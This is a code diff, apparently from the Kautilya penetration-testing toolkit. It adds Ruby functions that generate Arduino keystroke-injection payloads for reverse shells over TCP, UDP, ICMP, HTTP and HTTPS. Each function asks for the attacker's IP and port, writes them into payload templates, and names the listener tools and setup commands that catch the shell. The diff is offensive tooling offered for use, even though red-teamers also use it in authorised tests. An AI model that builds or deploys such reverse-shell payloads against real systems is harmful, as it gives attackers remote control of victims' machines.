@@ -655,13 +655,64 @@ def drop_jar
 end
 
 def reverse_tcp
-  puts"\nThis payload connects back to the attacker's machine on the given IP address and port.".bold
-  puts"\nSee this blog post for detailed usage: "
+  puts"\nThis payload connects back to the attacker's machine on the given IP address and TCP port.".bold
+  puts"\nA listener must be started on the attacker's machine on the given TCP port.".bold
+  puts"\nThe payload is derived from Powerfun written by Ben Turner & Dave Hardy "
+  puts"\nSee this blog post for detailed usage: http://www.labofapenetrationtester.com/2016/01/kautilya-easy-reverse-shells.html"
   ipaddr = input("Enter the IP address to which the target will connect back: ")
-  port  = input("Enter the port on which the target will connect back: ")
+  port  = input("Enter the TCP port on which the target will connect back: ")
   search_replace("./lib/src/reverse_tcp.ino","#$output_path/output/reverse_tcp.ino", ipaddr,port)
+end
 
+def reverse_udp
+  puts"\nThis payload connects back to the attacker's machine on the given IP address and UDP port.".bold
+  puts"\nA listener must be started on the attacker's machine on the given UDP port.".bold
+  puts"\nSee this blog post for detailed usage: http://www.labofapenetrationtester.com/2016/01/kautilya-easy-reverse-shells.html"
+  ipaddr = input("Enter the IP address to which the target will connect back: ")
+  port  = input("Enter the UDP port on which the target will connect back: ")
+  search_replace("./lib/src/reverse_udp.ino","#$output_path/output/reverse_udp.ino", ipaddr,port)
+end
 
+def reverse_icmp
+  puts"\nThis payload connects back to the attacker's machine on the given IP address using ICMPv4 protocol.".bold
+  puts"\nA ICMP listerner server is to be used with this paylod. is icmpsh_m.py from the icmpsh tools (https://github.com/inquisb/icmpsh)"
+  puts"\nUse icmpsh_m.py from the icmpsh tools (https://github.com/inquisb/icmpsh)"
+  puts"\nRun this command on the listener Linux before running the server 'sysctl -w net.ipv4.icmp_echo_ignore_all=1'"
+  puts"\nSee this blog post for detailed usage: http://www.labofapenetrationtester.com/2016/01/kautilya-easy-reverse-shells.html"
+  ipaddr = input("Enter the IP address to which the target will connect back: ")
+  buffersize = input("Enter the BufferSize (Hit enter for default 128): ")
+  delay = input("Enter the delay in seconds for which the payload waits before checking for next command (Hit enter for default 5): ")
+  if (buffersize == "")
+    buffersize = "128"
+  end
+  if (delay == "")
+    delay = "5"
+  end
+  search_replace("./lib/src/reverse_icmp.ino","#$output_path/output/reverse_icmp.ino", ipaddr,buffersize,delay)
+end
+
+def reverse_https
+  puts"\nThis payload connects back to the attacker's machine on the given IP address using valid HTTPS connection.".bold
+  puts"\nThe listener to be used with this machine, Invoke-PoshRatHttps.ps1 could be found in the extras directory."
+  puts"\nThe listener, which is a PowerShell script must be run from an elevated shell on attacker's Windows machine."
+  puts"\nThe target makes an initial connection over HTTP to establish a valid HTTPS connection later on."
+  puts"\nSee this blog post for detailed usage: http://www.labofapenetrationtester.com/2016/01/kautilya-easy-reverse-shells.html"
+  ipaddr = input("Enter the IP address to which the target will connect back: ")
+  port = input("Enter the HTTPS port to which the target will make the connection: ")
+  search_replace("./lib/src/reverse_https.ino","#$output_path/output/reverse_https.ino", ipaddr,port)
+end
+
+def reverse_http
+  puts"\nThis payload connects back to the attacker's machine on the given IP address using HTTP connection.".bold
+  puts"\nThe listener to be used with this machine, Invoke-PoshRatHttp.ps1 could be found in the extras directory."
+  puts"\nThe listener, which is a PowerShell script must be run from an elevated shell on attacker's Windows machine."
+  puts"\nSee this blog post for detailed usage: http://www.labofapenetrationtester.com/2016/01/kautilya-easy-reverse-shells.html"
+  ipaddr = input("Enter the IP address to which the target will connect back: ")
+  port = input("Enter the HTTP port to which the target will make the initial connection (Hit Enter for default port 80): ")
+  if (port == "")
+    port = "80"
+  end
+  search_replace("./lib/src/reverse_http.ino","#$output_path/output/reverse_http.ino", ipaddr,port)
 end
 
 ######################### Linux payloads start here ###########################
